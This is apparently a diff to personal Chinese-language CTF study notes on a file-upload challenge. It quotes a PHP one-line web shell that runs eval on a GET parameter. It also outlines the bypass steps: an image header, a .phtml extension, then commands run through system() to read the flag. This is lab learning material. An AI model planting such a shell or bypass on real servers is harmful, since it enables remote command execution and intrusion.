@@ -81,4 +81,5 @@
 	var_dump打印变量。scandir扫描目录，返回数组。get_file_contents将文件读入字符串返回
 [极客大挑战 2019]Upload
 	#文件上传漏洞 
-	上传一句话木马图片，提示非图片，加上图片头，过检测，提示包含< ？使用js执行php脚本<script language='php'>eval($_GET[cmd]);</script>,上传成功，但是其不会自动执行，在burpsuite抓包之后，修改其后缀为phtml(包含php的html)，猜测其在upload文件夹下，进入执行，通过system()请求ls命令以及ls /
+	上传一句话木马图片，提示非图片，加上图片头，过检测，提示包含< ？使用js执行php脚本<script language='php'>eval($_GET[cmd]);</script>,上传成功，但是其不会自动执行，在burpsuite抓包之后，修改其后缀为phtml(包含php的html)，猜测其在upload文件夹下，进入执行，通过system()请求ls命令以及ls /，发现根目录下存在flag,执行cat flag，获取到flag。
+	常用的文件头：[[常用文件头]]
